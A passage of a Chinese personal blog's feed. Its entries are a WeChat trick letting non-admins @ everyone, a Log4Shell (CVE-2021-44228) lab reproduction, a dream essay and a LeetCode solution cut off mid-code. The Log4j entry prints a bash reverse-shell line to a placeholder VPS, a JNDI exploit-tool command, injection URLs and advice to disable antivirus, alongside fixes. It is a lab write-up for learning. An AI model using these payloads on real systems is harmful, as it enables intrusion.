            <title type="text">微信又一个漏洞，要被群聊疯狂@了</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/5/" />
            <id>https://xuoneyuan.github.io/posts/5/</id>
            <updated>2023-11-16T20:42:58&#43;08:00</updated>
            <published>2023-11-15T23:29:52&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">昨天晚上洗完澡，坐下来刚打开B站，首页就给我推了一个视频，封面赫然写着“微信叒爆新漏……</summary>
            
                <content type="html">&lt;p&gt;昨天晚上洗完澡，坐下来刚打开B站，首页就给我推了一个视频，封面赫然写着“微信叒爆新漏洞”，马上吸引了我的注意。很快啊，啪一下我就点了进去，迅速看完了这个视频，看完后打开微信，摩拳擦掌跃跃欲试开始复现这个漏洞。&lt;/p&gt;
&lt;h3 id=&#34;前置任务&#34;&gt;前置任务&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;必须在pc端&lt;/li&gt;
&lt;li&gt;必须有一个群的群主或管理员权限，换言之你必须要真的能@所有人&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;终章&#34;&gt;终章&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;在有权限的群里@所有人，将其ctrl+c&lt;/li&gt;
&lt;li&gt;到测试群（随便哪个，是不是管理无所谓）ctrl+v，然后引用群里随便某个人，再随便写一些东西&lt;/li&gt;
&lt;li&gt;发送，然后群里的其他人都会被你提到，即使你不是这个群的群主或者管理&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/weixin1.png&#34; alt=&#34;weixin&#34; title=&#34;其实这个漏洞前几年就有人用插件实现了，最近流传的方法让大家不用插件也能实现&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理&lt;/h3&gt;
&lt;p&gt;正常情况下，我们@一名用户，前端会给后端发送一段参数：&lt;/p&gt;
&lt;p&gt;@ u s e r n a m e : w x i d _ ******* @ # - d i v i d e r ) #  @ *****&lt;/p&gt;
&lt;p&gt;而@all时发送的参数会变成：&lt;/p&gt;
&lt;p&gt;@ u s e r n a m e : n o t i f y @ a l l @ # - d i v i d e r ) #  @ 所有人&lt;/p&gt;
&lt;h3 id=&#34;思维发散&#34;&gt;思维发散&lt;/h3&gt;
&lt;h5 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h5&gt;
&lt;p&gt;SQL注入的原理就是，后端并没有对前端传入的数据进行严格过滤，使用户输入当作代码来执行，从而让用户能够操纵数据库&lt;/p&gt;
&lt;p&gt;关于sqli，我分享一些视频如下&lt;/p&gt;




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1ZR4y1Y745&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    
&lt;p&gt;以下内容需掌握科学才能查看&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/lubenwei.png&#34; alt=&#34;weixin&#34; title=&#34;不会真有人想在b站试试sqli吧，不会吧不会吧&#34;&gt;&lt;/p&gt;
&lt;style&gt;
    .meta-media {
      position: relative;
      margin-bottom: 30px;
      display: flex;
      width: 100%;
      height: 0;
      padding-bottom: 75%;
    }
    .video {
      position: absolute;
      width: 100%;
      height: 100%;
      left: 0;
      top: 0;
    }
    &lt;/style&gt;
    &lt;div class=&#34;meta-media&#34;&gt;
    &lt;iframe src=&#34;https://www.youtube.com/embed/cx6Xs3F_1Uc&#34; frameborder=&#34;no&#34; scrolling=&#34;yes&#34; allowfullscreen=&#34;allowfullscreen&#34; high_quality=&#34;1&#34; framespacing=&#34;1&#34; class=&#34;video&#34; &gt;
    &lt;/iframe&gt;
    &lt;/div&gt;
&lt;h5 id=&#34;腾讯&#34;&gt;腾讯&lt;/h5&gt;
&lt;p&gt;其实腾讯的两大通讯产品QQ和微信安全性已经毋庸置疑了，尤其是移动端。举个例子，你的个人二维码在移动端的浏览器上是打不开的，它会一直提示正在前往QQ，但其实无论你怎么升级QQ它也不会跳转到QQ的，借助第三方也不行。不信的话，你在pc端和移动端分别点击我博客下方的QQ标识，弹出的结果是不一样的。对于字符串拼接的问题，我都能想到预编译和参数化查询这些解决方法，难道腾讯的工程师还想不到吗？至于微信支付破解版？嗯，还是好好学习吧~&lt;/p&gt;
&lt;!-- ##### 改编科学家笑话一则
falcone刚开游戏，室友便看着他笑，说道“你玩游戏又开挂了”，falcone不说话，打开3dm查，要一个ct，打开风灵月影。室友又高声说道“你账号一定又被检测出存在不合法数据了”，falcone睁大眼睛说“你怎么凭空污人清白”，“什么清白，我亲眼看见你被封号，直接踢出战局”，falcone涨红了脸，争辩道“小开不算开……单机游戏的事，能算开吗？”接着便是难懂的话，什么“提高游戏体验”，什么“开挂保身”之类，宿舍内外充满了快活的空气。--&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" term="漏洞复现" label="漏洞复现" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E5%BE%AE%E4%BF%A1/" term="微信" label="微信" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/security/" term="security" label="security" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Apache Log4j2 远程代码执行漏洞(CVE-2021-44228)</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/4/" />
            <id>https://xuoneyuan.github.io/posts/4/</id>
            <updated>2023-11-14T11:54:42&#43;08:00</updated>
            <published>2023-11-13T23:05:58&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">这篇文章是从老博客搬过来的，很经典的一个漏洞，暑假搞的，现在好久都没做过漏洞复现了 前……</summary>
            
                <content type="html">&lt;p&gt;这篇文章是从老博客搬过来的，很经典的一个漏洞，暑假搞的，现在好久都没做过漏洞复现了&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;做这个漏洞复现的主要原因是因为在看微信公众号文章的时候看到了这么一张图，第一眼看的时候就没绷住，后来在空间看到一个福建来的信安天才少年发了说说就是这张图，感觉有点意思，就想着自己也来复现一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-13.png&#34; alt=&#34;每次看都绷不住&#34; title=&#34;学网络安全导致的&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里我翻译一下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ldap://：这表示URL使用LDAP协议进行通信&lt;/li&gt;
&lt;li&gt;chinaran404：这是LDAP服务器的主机名或IP地址&lt;/li&gt;
&lt;li&gt;/loveme：这是LDAP服务器内特定资源的路径，可能是一个目录、条目或其他对象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这不禁让我想起了这张图（知乎看到的，侵删）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-15.png&#34; alt=&#34;真的是一个悲伤的故事&#34; title=&#34;这位兄弟到底经历了什么&#34;&gt;&lt;/p&gt;
&lt;p&gt;好了言归正传，我们来分析一下这个漏洞&lt;/p&gt;
&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h3&gt;
&lt;h4 id=&#34;log4j2是什么&#34;&gt;log4j2是什么&lt;/h4&gt;
&lt;p&gt;log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息&lt;/p&gt;
&lt;h4 id=&#34;jndi是什么&#34;&gt;JNDI是什么&lt;/h4&gt;
&lt;p&gt;JNDI，全称为Java命名和目录接口（Java Naming and Directory Interface）,是SUN公司提供的一种标准的Java命名系统接口，允许从指定的远程服务器获取并加载对象。JNDI相当于一个用于映射的字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务&lt;/p&gt;
&lt;h4 id=&#34;log4j2远程代码执行漏洞原理&#34;&gt;log4j2远程代码执行漏洞原理&lt;/h4&gt;
&lt;p&gt;log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）&lt;br&gt;
攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，造成了远程代码执行（可反弹shell到指定服务器）&lt;/p&gt;
&lt;p&gt;示意图:
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-17.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞等级&#34;&gt;漏洞等级&lt;/h4&gt;
&lt;p&gt;高危&lt;br&gt;
官方 CVSS 评分 10.0&lt;/p&gt;
&lt;h4 id=&#34;影响版本&#34;&gt;影响版本&lt;/h4&gt;
&lt;p&gt;Apache Log4j2 2.x &amp;lt;= 2.14.1&lt;br&gt;
Apache Log4j2 2.15.0-rc1（补丁绕过）&lt;/p&gt;
&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
&lt;h4 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h4&gt;
&lt;p&gt;这里我使用的是vulhub，利用docker启动关闭环境&lt;br&gt;
没有vulhub的可以用这个靶场：&lt;a href=&#34;https://vulfocus.cn/#/dashboard&#34;&gt;vulfocus&lt;/a&gt;&lt;br&gt;
没有docker的先下载
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-1.png&#34; alt=&#34;1&#34;&gt;
vulhub的下载&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
unzip vulhub-master.zip
cd vulhub-master
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后进入需要开启的漏洞路径&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd vulhub-master/xxx/xxx
docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-2.png&#34; alt=&#34;1&#34;&gt;
端口是8983，我们接下来访问http://192.168.xxx.xxx:8983/solr/#/
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-3.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞检测&#34;&gt;漏洞检测&lt;/h4&gt;
&lt;p&gt;官方POC(二选一）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://${sys:java.version}.xxx.dnslog.cn}
${jndi:rmi://${sys:java.version}.xxx.dnslog.cn}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用DnsLog平台检测dns回显，查看是否有漏洞存在，获取一个子域名
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-4.png&#34; alt=&#34;1&#34;&gt;
接着我们就可以对目标网站进行测试了，访问：http://192.168.xxx.xxx:8983/solr/admin/cores?${jndi:ldap://${sys:java.version}.xxxxxx.dnslog.cn }
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-5.png&#34; alt=&#34;1&#34;&gt;
返回，刷新后得到数据
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-6.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h4&gt;
&lt;p&gt;反弹shell的命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/vps_ip/6666 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着进行编码，对命令进行base64加密即可
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-18.png&#34; alt=&#34;1&#34;&gt;
接下来利用现成的JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，项目地址：&lt;a href=&#34;https://github.com/welk1n/JNDI-Injection-Exploit&#34;&gt;JNDI-Injection-Exploit&lt;/a&gt;
（注意下载的时候要关掉一切防火墙和实时保护）&lt;/p&gt;
&lt;p&gt;最迟到这里你的kali攻击机就要启动了，执行命令&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;#34;bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}&amp;#34; -A 192.168.xxx.xxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行后终端如图：
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-7.png&#34; alt=&#34;1&#34;&gt;
这里已经一键部署好了RMI和LDAP服务的站点，并给出了路径，我选择用ldap，JDK1.8的版本为ldap://192.168.xxx.xxx:1389/Exploit，JDK1.7的版本为：ldap://192.168.xxx.xxx:1389/Exploit 这两个版本任选一个都行
再打开一个终端开启nc
&lt;img src=&#34;https://xuoneyuan.github.io/images/l-8.png&#34; alt=&#34;1&#34;&gt;
把工具生成的payload插入到action后面&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://192.168.xxx.xxx:8983/solr/admin/cores?action=${jndi:ldap://192.168.xxx.xxx:1389/xxxxxx}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-9.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次返回kali我们可以看到nc成功反弹shell，但是我这里有一个小问题，就是shell没有反弹回来，查了一下csdn的一个大佬说他也反弹不回来，换了一个靶场就好了，所以可能是vulhub这个靶场的问题，我试了好几个端口比如6969，8888都没有成功反弹shell，这个时候已经凌晨2：40了，于是我决定先睡觉（&lt;del&gt;没错我就是懒狗&lt;/del&gt;）&lt;/p&gt;
&lt;p&gt;反弹成功的回显是这样的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-11.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;本来到这里就应该结束了，但是我还是发现一个问题，就是在JNDI注入工具上决定了你是黑客大佬还是脚本小子，如果只会用工具，那么小学生都能顺利完成这个漏洞复现（问题是我已经大学了），在JNDI脚本运行上我又出了问题&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-12.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;我尝试了一下网上的方法，说是maven打包出现了问题，我照他的方法重新配置了起步依赖，但是没有用，这个事情充分说明了不会编程的hacker就是个伪命题（你给我去学Java、golang）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-16.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;修复建议&#34;&gt;修复建议&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;设置log4j2.formatMsgNoLookups=True，相当于直接禁止lookup查询出栈，也就不可能请求到访问到远程的恶意站点&lt;/li&gt;
&lt;li&gt;对包含有&amp;quot;jndi:ldap://&amp;quot;、&amp;quot;jndi:rmi//&amp;quot;这样字符串的请求进行拦截，即拦截JNDI语句来防止JNDI注入&lt;/li&gt;
&lt;li&gt;对系统进行合理配置，禁止不必要的业务访问外网，配置网络防火墙,禁止系统主动外连网络等等&lt;/li&gt;
&lt;li&gt;升级log4j2组件到新的安全的版本&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;彩蛋&#34;&gt;彩蛋&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/l-14.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" term="漏洞复现" label="漏洞复现" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/apache/" term="apache" label="apache" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/security/" term="security" label="security" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">时间静止</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/3/" />
            <id>https://xuoneyuan.github.io/posts/3/</id>
            <updated>2023-12-02T22:54:15&#43;08:00</updated>
            <published>2023-11-10T14:31:54&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">BGM CONTENT 可能是因为昨天在感概时间过得太快，逝者如斯夫，要是我会时间静止就好了，听说四维生……</summary>
            
                <content type="html">&lt;h4 id=&#34;bgm&#34;&gt;BGM&lt;/h4&gt;
&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=330 height=86 src=&#34;https://xuoneyuan.github.io//music.163.com/outchain/player?type=2&amp;id=1365898499&amp;auto=0&amp;height=66&#34;&gt;&lt;/iframe&gt;
&lt;hr&gt;
&lt;h4 id=&#34;content&#34;&gt;CONTENT&lt;/h4&gt;
&lt;p&gt;可能是因为昨天在感概时间过得太快，逝者如斯夫，要是我会时间静止就好了，听说四维生物多出来的那个坐标轴就是时间轴，我会时间静止也就意味我完成了维度进化233。今天早上就做了一个梦，我来到了一座魔法学院，学习的就是时间静止魔法。我本来毫无目的在学校里面乱逛的时候突然发现了一座城堡，哥特式建筑。在这座城堡的阳台，有一个合唱团正在演出，我站在城堡窗户的外檐（就是空调师傅装外机的位置），旁边还站着一排人，大家都在静静地听合唱团演奏，首先是一个儿童合唱团，童声非常清澈空灵，引得我旁边的两个女孩子赞叹不已（醒来时我发现完全不认识这两个女生）。然后又换了一个合唱团，这次是中央音乐学院的学生前来演奏。正当我在安静欣赏的时候我发现了两个高中同学，于是接下来我就跳到了地面上，随后左拐一路小跑进入了城堡内部，眼前是一片宽阔的长廊，没有怪物，没有敌人，我一下子反应过来我应该是走错了，于是我往回跑，进入了另一个大门。当我下楼梯时突然转角遇到爱，一个boss出现在我面前，我们两个马上交手，刚刚打了两个回合，我就醒来了。&lt;/p&gt;
&lt;p&gt;醒来以后后知后觉，因为那个敌人（四个字，具体叫什么忘了）身穿铠甲，手持一把画戟，而我是赤手空拳，论近战我肯定不是他的对手，顿时庆幸我及时醒了，要不然我哪里打得过他，必须得溜了。现在复盘下来这座城堡里长廊的原型应该是韦伯·维尔维特所在的学院（《君主·埃尔梅罗二世事件簿》的男主）和秀知院（《辉夜大小姐想让我告白》背景学校）的结合，进城堡前的外观原型是《艾尔登法环》里雷亚卢卡利亚魔法学院和王城罗德尔的结合，楼梯转角具体是哪里实在是无从考证，没有灯，只有一些火把来照亮视线，而且楼梯不是木质的是不锈钢做的，刷了一层暗红色油漆，踩在上面有清脆的噔噔噔金属撞击声，boss长得有一点像失乡骑士，但是更矮，铠甲是黄铜色的。&lt;/p&gt;
&lt;p&gt;后面又有一点失落，我的一切想象都是基于现实中已经存在的游戏、动漫、音乐形成的，还是没有脱离现实的桎梏，醒来后我还是一个地球人，不是三体人，没有水滴，在浩瀚无垠的宇宙中进行着不知道要去向何方的孤独流浪。&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%84%9F%E6%83%B3/" term="感想" label="感想" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E6%97%A5%E5%B8%B8/" term="日常" label="日常" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E7%94%9F%E6%B4%BB/" term="生活" label="生活" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">接雨水</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/2/" />
            <id>https://xuoneyuan.github.io/posts/2/</id>
            <updated>2023-11-13T23:25:30&#43;08:00</updated>
            <published>2023-11-09T20:21:59&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">嗨害嗨，我接雨水又来了嗷，为什么三番五次的讲这个题目呢？因为这题实在是太经典了，好的……</summary>
            
                <content type="html">&lt;p&gt;嗨害嗨，我接雨水又来了嗷，为什么三番五次的讲这个题目呢？因为这题实在是太经典了，好的题目无论做多少遍都是值得的，常做常新的。&lt;/p&gt;
&lt;p&gt;先看题目，废话不多说，家人们，上&lt;a href=&#34;https://leetcode.cn/problems/trapping-rain-water/description/&#34;&gt;链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/jieyushui.png&#34; alt=&#34;jieyushui.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;核心思路&#34;&gt;核心思路&lt;/h2&gt;
&lt;p&gt;对于此题从局部到整体，比如位置i，装水大小取决于左右两边最高柱子的最小值，分别称这两个柱子高度为l_max和r_max；位置 i 最大的水柱高度就是min(l_max, r_max)&lt;/p&gt;
&lt;p&gt;代码实现&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;water&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;左边最高的柱子&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;右边最高的柱子&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;一个简单的暴力解法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
